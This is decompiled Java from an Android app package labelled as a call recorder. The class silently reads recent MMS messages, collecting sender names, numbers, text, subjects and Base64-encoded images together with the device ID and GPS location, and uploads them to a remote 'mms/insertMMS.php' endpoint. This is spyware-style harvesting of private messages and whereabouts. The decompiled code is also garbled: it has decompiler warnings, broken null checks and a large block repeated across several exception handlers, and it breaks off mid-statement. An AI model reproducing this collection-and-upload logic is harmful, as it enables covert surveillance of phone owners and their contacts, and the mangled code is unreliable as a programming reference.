package com.yasoka.spcallrecord.recorder.call.a.c.g;

import a.b.a.a.a;
import a.c.b.D;
import a.c.b.Y;
import a.c.e.e;
import a.c.j.c;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.net.Uri;
import android.os.Build.VERSION;
import android.provider.Telephony.Mms;
import android.util.Base64;
import com.app.received.LocationReceived;
import com.crashlytics.android.Crashlytics;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.security.MessageDigest;
import java.text.MessageFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

/* compiled from: MMSMessages */
public class g extends Thread {

    /* renamed from: e reason: collision with root package name */
    private static String f225e = "";

    /* renamed from: a reason: collision with root package name */
    private final Context f226a;

    /* renamed from: b reason: collision with root package name */
    private String f227b = "";

    /* renamed from: c reason: collision with root package name */
    private String f228c = "__,__";

    /* renamed from: d reason: collision with root package name */
    private Uri f229d;

    public g(Context context) {
        this.f226a = context;
    }

    private void a(Cursor cursor) throws Exception {
        String str;
        String str2;
        int i;
        int i2;
        int i3;
        if (cursor.getCount() != 0) {
            String str3 = "date";
            if (VERSION.SDK_INT >= 19) {
                str = cursor.getString(cursor.getColumnIndex(str3));
            } else {
                str = cursor.getString(cursor.getColumnIndex(str3));
            }
            Calendar instance = Calendar.getInstance();
            instance.setTimeInMillis(Long.parseLong(str) * 1000);
            Calendar instance2 = Calendar.getInstance();
            instance2.setTime(new Date());
            instance2.add(12, -5);
            if (!instance.before(instance2)) {
                String str4 = "sub";
                String str5 = "_id";
                String str6 = "msg_box";
                String str7 = "m_type";
                if (VERSION.SDK_INT >= 19) {
                    i3 = Integer.parseInt(cursor.getString(cursor.getColumnIndex(str7)));
                    i2 = Integer.parseInt(cursor.getString(cursor.getColumnIndex(str6)));
                    i = Integer.parseInt(cursor.getString(cursor.getColumnIndex(str5)));
                    str2 = cursor.getString(cursor.getColumnIndex(str4));
                } else {
                    i3 = Integer.parseInt(cursor.getString(cursor.getColumnIndex(str7)));
                    i2 = Integer.parseInt(cursor.getString(cursor.getColumnIndex(str6)));
                    i = Integer.parseInt(cursor.getString(cursor.getColumnIndex(str5)));
                    str2 = cursor.getString(cursor.getColumnIndex(str4));
                }
                if (i3 == 128 && i2 == 2) {
                    a(i, str2, str, "2");
                } else if (i3 == 130 || i3 == 132) {
                    a(i, str2, str, "1");
                }
            }
        }
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(4:13|(2:15|16)|17|18) */
    /* JADX WARNING: Code restructure failed: missing block: B:10:0x0041, code lost:
        if (r1 != null) goto L_0x0043;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:12:?, code lost:
        r1.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:20:0x004f, code lost:
        if (r1 == null) goto L_0x0056;
     */
    /* JADX WARNING: Missing exception handler attribute for start block: B:17:0x004d */
    private String b(String str) {
        InputStream inputStream;
        StringBuilder sb = new StringBuilder();
        try {
            StringBuilder sb2 = new StringBuilder();
            sb2.append("content://mms/part/");
            sb2.append(str);
            Uri parse = Uri.parse(sb2.toString());
            inputStream = null;
            inputStream = this.f226a.getContentResolver().openInputStream(parse);
            if (inputStream != null) {
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"));
                for (String readLine = bufferedReader.readLine(); readLine != null; readLine = bufferedReader.readLine()) {
                    sb.append(readLine);
                }
            }
        } catch (IOException unused) {
        } catch (Exception e2) {
            e2.getStackTrace();
        } catch (Throwable th) {
            if (inputStream != null) {
                inputStream.close();
            }
            throw th;
        }
        return sb.toString();
    }

    public void run() {
        try {
            if (VERSION.SDK_INT >= 19) {
                this.f229d = Mms.CONTENT_URI;
            } else {
                this.f229d = Uri.parse("content://mms");
            }
            Cursor query = this.f226a.getContentResolver().query(this.f229d, null, null, null, null);
            if (query != null && query.getCount() != 0) {
                if (!query.moveToFirst()) {
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e2) {
                        e2.getStackTrace();
                    }
                    if (query.moveToFirst()) {
                        a(query);
                        return;
                    }
                    return;
                }
                a(query);
            }
        } catch (Exception e3) {
            e3.getStackTrace();
        }
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(4:53|54|55|56) */
    /* JADX WARNING: Code restructure failed: missing block: B:107:0x02a8, code lost:
        if (r37.isEmpty() != false) goto L_0x02aa;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:122:0x02d1, code lost:
        if (r37.isEmpty() != false) goto L_0x02d3;
     */
    /* JADX WARNING: Missing exception handler attribute for start block: B:55:0x0179 */
    /* JADX WARNING: Removed duplicated region for block: B:105:0x02a4 A[SYNTHETIC, Splitter:B:105:0x02a4] */
    /* JADX WARNING: Removed duplicated region for block: B:145:0x0368  */
    /* JADX WARNING: Removed duplicated region for block: B:203:0x05de A[Catch:{ Exception -> 0x05fc }] */
    /* JADX WARNING: Removed duplicated region for block: B:32:0x00ef A[Catch:{ Exception -> 0x0103 }] */
    /* JADX WARNING: Removed duplicated region for block: B:47:0x0155 A[Catch:{ Exception -> 0x018b }] */
    /* JADX WARNING: Removed duplicated region for block: B:60:0x0187 A[Catch:{ Exception -> 0x018b }] */
    /* JADX WARNING: Removed duplicated region for block: B:67:0x01ce A[Catch:{ Exception -> 0x0211 }] */
    /* JADX WARNING: Removed duplicated region for block: B:81:0x020d A[Catch:{ Exception -> 0x0211 }] */
    /* JADX WARNING: Removed duplicated region for block: B:89:0x0226 A[SYNTHETIC, Splitter:B:89:0x0226] */
    /* JADX WARNING: Removed duplicated region for block: B:98:0x0291 A[Catch:{ Exception -> 0x0298 }] */
    private void a(int i, String str, String str2, String str3) {
        SimpleDateFormat simpleDateFormat;
        Calendar calendar;
        StringBuilder sb;
        StringBuilder sb2;
        int i2;
        String str4;
        String str5;
        double d2;
        double d3;
        SimpleDateFormat simpleDateFormat2;
        String str6;
        HashMap hashMap;
        long j;
        long j2;
        String str7;
        Cursor query;
        Cursor query2;
        boolean z;
        int i3 = i;
        String str8 = str;
        String str9 = "-";
        String str10 = "insert-address-token";
        String str11 = "content://mms/{0}/addr";
        String str12 = "msg_id=";
        String str13 = "address";
        String str14 = "\n";
        String str15 = "";
        Calendar instance = Calendar.getInstance();
        instance.setTimeInMillis(Long.parseLong(str2) * 1000);
        SimpleDateFormat d4 = c.d();
        StringBuilder a2 = a.a("MMSMonitor :: Date  == ");
        a2.append(d4.format(instance.getTime()));
        a2.toString();
        ArrayList arrayList = new ArrayList();
        ArrayList arrayList2 = new ArrayList();
        StringBuilder sb3 = new StringBuilder();
        try {
            Uri parse = Uri.parse("content://mms/part");
            ContentResolver contentResolver = this.f226a.getContentResolver();
            StringBuilder sb4 = new StringBuilder();
            calendar = instance;
            try {
                sb4.append("mid = ");
                sb4.append(i3);
                Cursor query3 = contentResolver.query(parse, null, sb4.toString(), null, "_id");
                if (query3 == null || !query3.moveToLast()) {
                    simpleDateFormat = d4;
                    sb = new StringBuilder();
                    try {
                        sb.append(str15);
                        StringBuilder sb5 = new StringBuilder();
                        sb5.append(str12);
                        sb5.append(i3);
                        String str16 = new String(sb5.toString());
                        query2 = this.f226a.getContentResolver().query(Uri.parse(MessageFormat.format(str11, new Object[]{Integer.valueOf(i)})), null, str16, null, null);
                        if (query2 != null || !query2.moveToFirst()) {
                            if (query2 != null) {
                                query2.close();
                            }
                            String sb6 = sb.toString();
                            sb2 = new StringBuilder();
                            try {
                                sb2.append(str15);
                                StringBuilder sb7 = new StringBuilder();
                                sb7.append(str12);
                                sb7.append(i3);
                                String sb8 = sb7.toString();
                                query = this.f226a.getContentResolver().query(Uri.parse(MessageFormat.format(str11, new Object[]{Integer.valueOf(i)})), null, sb8, null, null);
                                if (query != null || !query.moveToFirst()) {
                                    if (query != null) {
                                        query.close();
                                    }
                                    String sb9 = sb2.toString();
                                    HashMap hashMap2 = new HashMap();
                                    try {
                                        String str17 = "dataSize";
                                        if (arrayList.size() != 0) {
                                            Iterator it = arrayList.iterator();
                                            int i4 = 0;
                                            while (it.hasNext()) {
                                                Bitmap bitmap = (Bitmap) it.next();
                                                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                                                Iterator it2 = it;
                                                bitmap.compress(CompressFormat.JPEG, 100, byteArrayOutputStream);
                                                i2 = 0;
                                                try {
                                                    String encodeToString = Base64.encodeToString(byteArrayOutputStream.toByteArray(), 0);
                                                    StringBuilder sb10 = new StringBuilder();
                                                    sb10.append("data");
                                                    sb10.append(i4);
                                                    String sb11 = sb10.toString();
                                                    StringBuilder sb12 = new StringBuilder();
                                                    sb12.append(str15);
                                                    sb12.append(encodeToString);
                                                    hashMap2.put(sb11, sb12.toString());
                                                    i4++;
                                                    arrayList2.add(encodeToString);
                                                    it = it2;
                                                } catch (Exception e2) {
                                                    e = e2;
                                                    e.getStackTrace();
                                                    str4 = str;
                                                    if (str4 != null) {
                                                    }
                                                }
                                            }
                                            i2 = 0;
                                            StringBuilder sb13 = new StringBuilder();
                                            sb13.append(str15);
                                            sb13.append(arrayList2.size());
                                            hashMap2.put(str17, sb13.toString());
                                        } else {
                                            i2 = 0;
                                            hashMap2.put(str17, "0");
                                        }
                                    } catch (Exception e3) {
                                        e = e3;
                                        i2 = 0;
                                        e.getStackTrace();
                                        str4 = str;
                                        if (str4 != null) {
                                        }
                                    }
                                    str4 = str;
                                    if (str4 != null) {
                                        try {
                                        } catch (Exception e4) {
                                            e4.getStackTrace();
                                        }
                                    }
                                    if (sb9.isEmpty() && sb6.isEmpty() && sb3.toString().isEmpty() && arrayList.size() == 0) {
                                    }
                                    if (str4 != null) {
                                        try {
                                        } catch (Exception e5) {
                                            e5.getStackTrace();
                                        }
                                    }
                                    if (sb3.toString().isEmpty() && arrayList.size() == 0) {
                                        return;
                                    }
                                    StringBuilder sb14 = new StringBuilder();
                                    StringBuilder sb15 = new StringBuilder();
                                    sb15.append(i3);
                                    sb15.append(str4);
                                    sb15.append(sb9);
                                    sb15.append(sb3.toString());
                                    String sb16 = sb15.toString();
                                    try {
                                        MessageDigest instance2 = MessageDigest.getInstance("MD5");
                                        instance2.reset();
                                        instance2.update(sb16.getBytes());
                                        byte[] digest = instance2.digest();
                                        int length = digest.length;
                                        StringBuilder sb17 = new StringBuilder(length << 1);
                                        while (i2 < length) {
                                            str7 = sb16;
                                            try {
                                                sb17.append(Character.forDigit((digest[i2] & 240) >> 4, 16));
                                                sb17.append(Character.forDigit(digest[i2] & 15, 16));
                                                i2++;
                                                sb16 = str7;
                                            } catch (Exception e6) {
                                                e = e6;
                                                e.getStackTrace();
                                                str5 = str7;
                                                this.f227b = a.b(sb14, str5, " ");
                                                if (!f225e.contains(this.f227b)) {
                                                }
                                                return;
                                            }
                                        }
                                        String str18 = sb16;
                                        str5 = sb17.toString();
                                    } catch (Exception e7) {
                                        e = e7;
                                        str7 = sb16;
                                        e.getStackTrace();
                                        str5 = str7;
                                        this.f227b = a.b(sb14, str5, " ");
                                        if (!f225e.contains(this.f227b)) {
                                        }
                                        return;
                                    }
                                    this.f227b = a.b(sb14, str5, " ");
                                    if (!f225e.contains(this.f227b)) {
                                        StringBuilder sb18 = new StringBuilder();
                                        sb18.append(f225e);
                                        sb18.append(this.f227b);
                                        f225e = sb18.toString();
                                        if (f225e.length() > 10000) {
                                            f225e = str15;
                                        }
                                        double d5 = 0.0d;
                                        try {
                                            Location a3 = LocationReceived.a();
                                            if (a3 != null) {
                                                try {
                                                    d3 = a3.getLongitude();
                                                    try {
                                                        d2 = a3.getLatitude();
                                                        try {
                                                            d5 = (double) a3.getAccuracy();
                                                            j2 = a3.getTime();
                                                        } catch (Exception e8) {
                                                            e = e8;
                                                            simpleDateFormat2 = simpleDateFormat;
                                                            str6 = str15;
                                                            e.getStackTrace();
                                                            double d6 = d5;
                                                            ArrayList arrayList3 = arrayList2;
                                                            double d7 = d3;
                                                            double d8 = d2;
                                                            StringBuilder a4 = a.a(str15);
                                                            a4.append(e.e(this.f226a));
                                                            hashMap2.put("idPhone", a4.toString());
                                                            StringBuilder sb19 = new StringBuilder();
                                                            sb19.append(str15);
                                                            sb19.append(sb9);
                                                            hashMap2.put("name", sb19.toString());
                                                            StringBuilder sb20 = new StringBuilder();
                                                            sb20.append(str15);
                                                            sb20.append(sb6);
                                                            hashMap2.put("number", sb20.toString());
                                                            StringBuilder sb21 = new StringBuilder();
                                                            sb21.append(str15);
                                                            sb21.append(sb3.toString());
                                                            hashMap2.put("message", sb21.toString());
                                                            StringBuilder sb22 = new StringBuilder();
                                                            sb22.append(str15);
                                                            sb22.append(str4);
                                                            hashMap2.put("subject", sb22.toString());
                                                            StringBuilder sb23 = new StringBuilder();
                                                            sb23.append(str15);
                                                            sb23.append(str3);
                                                            hashMap2.put("type", sb23.toString());
                                                            StringBuilder sb24 = new StringBuilder();
                                                            sb24.append(str15);
                                                            sb24.append(simpleDateFormat2.format(calendar.getTime()));
                                                            hashMap2.put("date", sb24.toString());
                                                            StringBuilder sb25 = new StringBuilder();
                                                            sb25.append(str15);
                                                            sb25.append(str6);
                                                            hashMap2.put(str13, sb25.toString());
                                                            StringBuilder sb26 = new StringBuilder();
                                                            sb26.append(str15);
                                                            sb26.append(d7);
                                                            hashMap2.put("longitude", sb26.toString());
                                                            StringBuilder sb27 = new StringBuilder();
                                                            sb27.append(str15);
                                                            sb27.append(d8);
                                                            hashMap2.put("latitude", sb27.toString());
                                                            StringBuilder sb28 = new StringBuilder();
                                                            sb28.append(str15);
                                                            double d9 = d6;
                                                            sb28.append(d9);
                                                            hashMap2.put("accuracy", sb28.toString());
                                                            hashMap = hashMap2;
                                                            try {
                                                                new k(this.f226a, sb6, sb3.toString(), Integer.parseInt(str3)).start();
                                                                StringBuilder sb29 = new StringBuilder();
                                                                sb29.append(str15);
                                                                sb29.append(sb9);
                                                                String sb30 = sb29.toString();
                                                                StringBuilder sb31 = new StringBuilder();
                                                                sb31.append(str15);
                                                                sb31.append(sb6);
                                                                String sb32 = sb31.toString();
                                                                StringBuilder sb33 = new StringBuilder();
                                                                sb33.append(str15);
                                                                sb33.append(sb3.toString());
                                                                String sb34 = sb33.toString();
                                                                int parseInt = Integer.parseInt(str3);
                                                                StringBuilder sb35 = new StringBuilder();
                                                                sb35.append(str15);
                                                                sb35.append(simpleDateFormat2.format(calendar.getTime()));
                                                                String sb36 = sb35.toString();
                                                                StringBuilder sb37 = new StringBuilder();
                                                                sb37.append(str15);
                                                                sb37.append(str6);
                                                                String sb38 = sb37.toString();
                                                                StringBuilder sb39 = new StringBuilder();
                                                                sb39.append(str15);
                                                                sb39.append(d7);
                                                                String sb40 = sb39.toString();
                                                                StringBuilder sb41 = new StringBuilder();
                                                                sb41.append(str15);
                                                                sb41.append(d8);
                                                                String sb42 = sb41.toString();
                                                                StringBuilder sb43 = new StringBuilder();
                                                                sb43.append(str15);
                                                                sb43.append(d9);
                                                                String sb44 = sb43.toString();
                                                                StringBuilder sb45 = new StringBuilder();
                                                                sb45.append(str15);
                                                                sb45.append(str);
                                                                String sb46 = sb45.toString();
                                                                StringBuilder sb47 = new StringBuilder();
                                                                sb47.append(str15);
                                                                sb47.append(a(arrayList3));
                                                                String sb48 = sb47.toString();
                                                                try {
                                                                    Y y = new Y(this.f226a);
                                                                    D d10 = new D(sb30, sb32, sb34, parseInt, sb36, sb38, sb40, sb42, sb44, sb46, sb48);
                                                                    y.b();
                                                                    j = y.a(d10);
                                                                    y.a();
                                                                } catch (Exception e9) {
                                                                    try {
                                                                        e9.getStackTrace();
                                                                        Crashlytics.logException(e9);
                                                                    } catch (Exception unused) {
                                                                    }
                                                                    j = -1;
                                                                }
                                                                if (a.c.e.a.b("mms/insertMMS.php", (Map<String, String>) hashMap)) {
                                                                }
                                                            } catch (Exception e10) {
                                                                e = e10;
                                                                e.getStackTrace();
                                                                e.getStackTrace();
                                                                Crashlytics.logException(e);
                                                                return;
                                                            }
                                                            return;
                                                        }
                                                    } catch (Exception e11) {
                                                        e = e11;
                                                        simpleDateFormat2 = simpleDateFormat;
                                                        str6 = str15;
                                                        d2 = 0.0d;
                                                        e.getStackTrace();
                                                        double d62 = d5;
                                                        ArrayList arrayList32 = arrayList2;
                                                        double d72 = d3;
                                                        double d82 = d2;
                                                        StringBuilder a42 = a.a(str15);
                                                        a42.append(e.e(this.f226a));
                                                        hashMap2.put("idPhone", a42.toString());
                                                        StringBuilder sb192 = new StringBuilder();
                                                        sb192.append(str15);
                                                        sb192.append(sb9);
                                                        hashMap2.put("name", sb192.toString());
                                                        StringBuilder sb202 = new StringBuilder();
                                                        sb202.append(str15);
                                                        sb202.append(sb6);
                                                        hashMap2.put("number", sb202.toString());
                                                        StringBuilder sb212 = new StringBuilder();
                                                        sb212.append(str15);
                                                        sb212.append(sb3.toString());
                                                        hashMap2.put("message", sb212.toString());
                                                        StringBuilder sb222 = new StringBuilder();
                                                        sb222.append(str15);
                                                        sb222.append(str4);
                                                        hashMap2.put("subject", sb222.toString());
                                                        StringBuilder sb232 = new StringBuilder();
                                                        sb232.append(str15);
                                                        sb232.append(str3);
                                                        hashMap2.put("type", sb232.toString());
                                                        StringBuilder sb242 = new StringBuilder();
                                                        sb242.append(str15);
                                                        sb242.append(simpleDateFormat2.format(calendar.getTime()));
                                                        hashMap2.put("date", sb242.toString());
                                                        StringBuilder sb252 = new StringBuilder();
                                                        sb252.append(str15);
                                                        sb252.append(str6);
                                                        hashMap2.put(str13, sb252.toString());
                                                        StringBuilder sb262 = new StringBuilder();
                                                        sb262.append(str15);
                                                        sb262.append(d72);
                                                        hashMap2.put("longitude", sb262.toString());
                                                        StringBuilder sb272 = new StringBuilder();
                                                        sb272.append(str15);
                                                        sb272.append(d82);
                                                        hashMap2.put("latitude", sb272.toString());
                                                        StringBuilder sb282 = new StringBuilder();
                                                        sb282.append(str15);
                                                        double d92 = d62;
                                                        sb282.append(d92);
                                                        hashMap2.put("accuracy", sb282.toString());
                                                        hashMap = hashMap2;
                                                        new k(this.f226a, sb6, sb3.toString(), Integer.parseInt(str3)).start();
                                                        StringBuilder sb292 = new StringBuilder();
                                                        sb292.append(str15);
                                                        sb292.append(sb9);
                                                        String sb302 = sb292.toString();
                                                        StringBuilder sb312 = new StringBuilder();
                                                        sb312.append(str15);
                                                        sb312.append(sb6);
                                                        String sb322 = sb312.toString();
                                                        StringBuilder sb332 = new StringBuilder();
                                                        sb332.append(str15);
                                                        sb332.append(sb3.toString());
                                                        String sb342 = sb332.toString();
                                                        int parseInt2 = Integer.parseInt(str3);
                                                        StringBuilder sb352 = new StringBuilder();
                                                        sb352.append(str15);
                                                        sb352.append(simpleDateFormat2.format(calendar.getTime()));
                                                        String sb362 = sb352.toString();
                                                        StringBuilder sb372 = new StringBuilder();
                                                        sb372.append(str15);
                                                        sb372.append(str6);
                                                        String sb382 = sb372.toString();
                                                        StringBuilder sb392 = new StringBuilder();
                                                        sb392.append(str15);
                                                        sb392.append(d72);
                                                        String sb402 = sb392.toString();
                                                        StringBuilder sb412 = new StringBuilder();
                                                        sb412.append(str15);
                                                        sb412.append(d82);
                                                        String sb422 = sb412.toString();
                                                        StringBuilder sb432 = new StringBuilder();
                                                        sb432.append(str15);
                                                        sb432.append(d92);
                                                        String sb442 = sb432.toString();
                                                        StringBuilder sb452 = new StringBuilder();
                                                        sb452.append(str15);
                                                        sb452.append(str);
                                                        String sb462 = sb452.toString();
                                                        StringBuilder sb472 = new StringBuilder();
                                                        sb472.append(str15);
                                                        sb472.append(a(arrayList32));
                                                        String sb482 = sb472.toString();
                                                        Y y2 = new Y(this.f226a);
                                                        D d102 = new D(sb302, sb322, sb342, parseInt2, sb362, sb382, sb402, sb422, sb442, sb462, sb482);
                                                        y2.b();
                                                        j = y2.a(d102);
                                                        y2.a();
                                                        if (a.c.e.a.b("mms/insertMMS.php", (Map<String, String>) hashMap)) {
                                                        }
                                                        return;
                                                    }
                                                } catch (Exception e12) {
                                                    e = e12;
                                                    simpleDateFormat2 = simpleDateFormat;
                                                    str6 = str15;
                                                    d3 = 0.0d;
                                                    d2 = 0.0d;
                                                    e.getStackTrace();
                                                    double d622 = d5;
                                                    ArrayList arrayList322 = arrayList2;
                                                    double d722 = d3;
                                                    double d822 = d2;
                                                    StringBuilder a422 = a.a(str15);
                                                    a422.append(e.e(this.f226a));
                                                    hashMap2.put("idPhone", a422.toString());
                                                    StringBuilder sb1922 = new StringBuilder();
                                                    sb1922.append(str15);
                                                    sb1922.append(sb9);
                                                    hashMap2.put("name", sb1922.toString());
                                                    StringBuilder sb2022 = new StringBuilder();
                                                    sb2022.append(str15);
                                                    sb2022.append(sb6);
                                                    hashMap2.put("number", sb2022.toString());
                                                    StringBuilder sb2122 = new StringBuilder();
                                                    sb2122.append(str15);
                                                    sb2122.append(sb3.toString());
                                                    hashMap2.put("message", sb2122.toString());
                                                    StringBuilder sb2222 = new StringBuilder();
                                                    sb2222.append(str15);
                                                    sb2222.append(str4);
                                                    hashMap2.put("subject", sb2222.toString());
                                                    StringBuilder sb2322 = new StringBuilder();
                                                    sb2322.append(str15);
                                                    sb2322.append(str3);
                                                    hashMap2.put("type", sb2322.toString());
                                                    StringBuilder sb2422 = new StringBuilder();
                                                    sb2422.append(str15);
                                                    sb2422.append(simpleDateFormat2.format(calendar.getTime()));
                                                    hashMap2.put("date", sb2422.toString());
                                                    StringBuilder sb2522 = new StringBuilder();
                                                    sb2522.append(str15);
                                                    sb2522.append(str6);
                                                    hashMap2.put(str13, sb2522.toString());
                                                    StringBuilder sb2622 = new StringBuilder();
                                                    sb2622.append(str15);
                                                    sb2622.append(d722);
                                                    hashMap2.put("longitude", sb2622.toString());
                                                    StringBuilder sb2722 = new StringBuilder();
                                                    sb2722.append(str15);
                                                    sb2722.append(d822);
                                                    hashMap2.put("latitude", sb2722.toString());
                                                    StringBuilder sb2822 = new StringBuilder();
                                                    sb2822.append(str15);
                                                    double d922 = d622;
                                                    sb2822.append(d922);
                                                    hashMap2.put("accuracy", sb2822.toString());
                                                    hashMap = hashMap2;
                                                    new k(this.f226a, sb6, sb3.toString(), Integer.parseInt(str3)).start();
                                                    StringBuilder sb2922 = new StringBuilder();
                                                    sb2922.append(str15);
                                                    sb2922.append(sb9);
                                                    String sb3022 = sb2922.toString();
                                                    StringBuilder sb3122 = new StringBuilder();
                                                    sb3122.append(str15);
                                                    sb3122.append(sb6);
                                                    String sb3222 = sb3122.toString();
                                                    StringBuilder sb3322 = new StringBuilder();
                                                    sb3322.append(str15);
                                                    sb3322.append(sb3.toString());
                                                    String sb3422 = sb3322.toString();
                                                    int parseInt22 = Integer.parseInt(str3);
                                                    StringBuilder sb3522 = new StringBuilder();
                                                    sb3522.append(str15);
                                                    sb3522.append(simpleDateFormat2.format(calendar.getTime()));
                                                    String sb3622 = sb3522.toString();
                                                    StringBuilder sb3722 = new StringBuilder();
                                                    sb3722.append(str15);
                                                    sb3722.append(str6);
                                                    String sb3822 = sb3722.toString();
                                                    StringBuilder sb3922 = new StringBuilder();
                                                    sb3922.append(str15);
                                                    sb3922.append(d722);
                                                    String sb4022 = sb3922.toString();
                                                    StringBuilder sb4122 = new StringBuilder();
                                                    sb4122.append(str15);
                                                    sb4122.append(d822);
                                                    String sb4222 = sb4122.toString();
                                                    StringBuilder sb4322 = new StringBuilder();
                                                    sb4322.append(str15);
                                                    sb4322.append(d922);
                                                    String sb4422 = sb4322.toString();
                                                    StringBuilder sb4522 = new StringBuilder();
                                                    sb4522.append(str15);
                                                    sb4522.append(str);
                                                    String sb4622 = sb4522.toString();
                                                    StringBuilder sb4722 = new StringBuilder();
                                                    sb4722.append(str15);
                                                    sb4722.append(a(arrayList322));
                                                    String sb4822 = sb4722.toString();
                                                    Y y22 = new Y(this.f226a);
                                                    D d1022 = new D(sb3022, sb3222, sb3422, parseInt22, sb3622, sb3822, sb4022, sb4222, sb4422, sb4622, sb4822);
                                                    y22.b();
                                                    j = y22.a(d1022);
                                                    y22.a();
                                                    if (a.c.e.a.b("mms/insertMMS.php", (Map<String, String>) hashMap)) {
                                                    }
                                                    return;
                                                }
                                            } else {
                                                d3 = 0.0d;
                                                d2 = 0.0d;
                                                j2 = 0;
                                            }
                                            try {
                                                str6 = LocationReceived.a(this.f226a);
                                                if (j2 != 0) {
                                                    try {
                                                        simpleDateFormat2 = simpleDateFormat;
                                                        try {
                                                            String format = simpleDateFormat2.format(Long.valueOf(j2));
                                                            StringBuilder sb49 = new StringBuilder();
                                                            sb49.append(str6);
                                                            sb49.append("###DATELOC###");
                                                            sb49.append(format);
                                                            str6 = sb49.toString();
                                                        } catch (Exception e13) {
                                                            e = e13;
                                                            e.getStackTrace();
                                                            double d6222 = d5;
                                                            ArrayList arrayList3222 = arrayList2;
                                                            double d7222 = d3;
                                                            double d8222 = d2;
                                                            StringBuilder a4222 = a.a(str15);
                                                            a4222.append(e.e(this.f226a));
                                                            hashMap2.put("idPhone", a4222.toString());
                                                            StringBuilder sb19222 = new StringBuilder();
                                                            sb19222.append(str15);
                                                            sb19222.append(sb9);
                                                            hashMap2.put("name", sb19222.toString());
                                                            StringBuilder sb20222 = new StringBuilder();
                                                            sb20222.append(str15);
                                                            sb20222.append(sb6);
                                                            hashMap2.put("number", sb20222.toString());
                                                            StringBuilder sb21222 = new StringBuilder();
                                                            sb21222.append(str15);
                                                            sb21222.append(sb3.toString());
                                                            hashMap2.put("message", sb21222.toString());
                                                            StringBuilder sb22222 = new StringBuilder();
                                                            sb22222.append(str15);
                                                            sb22222.append(str4);
                                                            hashMap2.put("subject", sb22222.toString());
                                                            StringBuilder sb23222 = new StringBuilder();
                                                            sb23222.append(str15);
                                                            sb23222.append(str3);
                                                            hashMap2.put("type", sb23222.toString());
                                                            StringBuilder sb24222 = new StringBuilder();
                                                            sb24222.append(str15);
                                                            sb24222.append(simpleDateFormat2.format(calendar.getTime()));
                                                            hashMap2.put("date", sb24222.toString());
                                                            StringBuilder sb25222 = new StringBuilder();
                                                            sb25222.append(str15);
                                                            sb25222.append(str6);
                                                            hashMap2.put(str13, sb25222.toString());
                                                            StringBuilder sb26222 = new StringBuilder();
                                                            sb26222.append(str15);
                                                            sb26222.append(d7222);
                                                            hashMap2.put("longitude", sb26222.toString());
                                                            StringBuilder sb27222 = new StringBuilder();
                                                            sb27222.append(str15);
                                                            sb27222.append(d8222);
                                                            hashMap2.put("latitude", sb27222.toString());
                                                            StringBuilder sb28222 = new StringBuilder();
                                                            sb28222.append(str15);
                                                            double d9222 = d6222;
                                                            sb28222.append(d9222);
                                                            hashMap2.put("accuracy", sb28222.toString());
                                                            hashMap = hashMap2;
                                                            new k(this.f226a, sb6, sb3.toString(), Integer.parseInt(str3)).start();
                                                            StringBuilder sb29222 = new StringBuilder();
                                                            sb29222.append(str15);
                                                            sb29222.append(sb9);
                                                            String sb30222 = sb29222.toString();
                                                            StringBuilder sb31222 = new StringBuilder();
                                                            sb31222.append(str15);
                                                            sb31222.append(sb6);
                                                            String sb32222 = sb31222.toString();
                                                            StringBuilder sb33222 = new StringBuilder();
                                                            sb33222.append(str15);
                                                            sb33222.append(sb3.toString());
                                                            String sb34222 = sb33222.toString();
                                                            int parseInt222 = Integer.parseInt(str3);
                                                            StringBuilder sb35222 = new StringBuilder();
                                                            sb35222.append(str15);
                                                            sb35222.append(simpleDateFormat2.format(calendar.getTime()));
                                                            String sb36222 = sb35222.toString();
                                                            StringBuilder sb37222 = new StringBuilder();
                                                            sb37222.append(str15);
                                                            sb37222.append(str6);
                                                            String sb38222 = sb37222.toString();
                                                            StringBuilder sb39222 = new StringBuilder();
                                                            sb39222.append(str15);
                                                            sb39222.append(d7222);
                                                            String sb40222 = sb39222.toString();
                                                            StringBuilder sb41222 = new StringBuilder();
                                                            sb41222.append(str15);
                                                            sb41222.append(d8222);
                                                            String sb42222 = sb41222.toString();
                                                            StringBuilder sb43222 = new StringBuilder();
                                                            sb43222.append(str15);
                                                            sb43222.append(d9222);
                                                            String sb44222 = sb43222.toString();
                                                            StringBuilder sb45222 = new StringBuilder();
                                                            sb45222.append(str15);
                                                            sb45222.append(str);
                                                            String sb46222 = sb45222.toString();
                                                            StringBuilder sb47222 = new StringBuilder();
                                                            sb47222.append(str15);
                                                            sb47222.append(a(arrayList3222));
                                                            String sb48222 = sb47222.toString();
                                                            Y y222 = new Y(this.f226a);
                                                            D d10222 = new D(sb30222, sb32222, sb34222, parseInt222, sb36222, sb38222, sb40222, sb42222, sb44222, sb46222, sb48222);
                                                            y222.b();
                                                            j = y222.a(d10222);
                                                            y222.a();
                                                            if (a.c.e.a.b("mms/insertMMS.php", (Map<String, String>) hashMap)) {
                                                            }
                                                            return;
                                                        }
                                                    } catch (Exception e14) {
                                                        e = e14;
                                                        simpleDateFormat2 = simpleDateFormat;
                                                        e.getStackTrace();
                                                        double d62222 = d5;
                                                        ArrayList arrayList32222 = arrayList2;
                                                        double d72222 = d3;
                                                        double d82222 = d2;
                                                        StringBuilder a42222 = a.a(str15);
                                                        a42222.append(e.e(this.f226a));
                                                        hashMap2.put("idPhone", a42222.toString());
                                                        StringBuilder sb192222 = new StringBuilder();
                                                        sb192222.append(str15);
                                                        sb192222.append(sb9);
                                                        hashMap2.put("name", sb192222.toString());
                                                        StringBuilder sb202222 = new StringBuilder();
                                                        sb202222.append(str15);
                                                        sb202222.append(sb6);
                                                        hashMap2.put("number", sb202222.toString());
                                                        StringBuilder sb212222 = new StringBuilder();
                                                        sb212222.append(str15);
                                                        sb212222.append(sb3.toString());
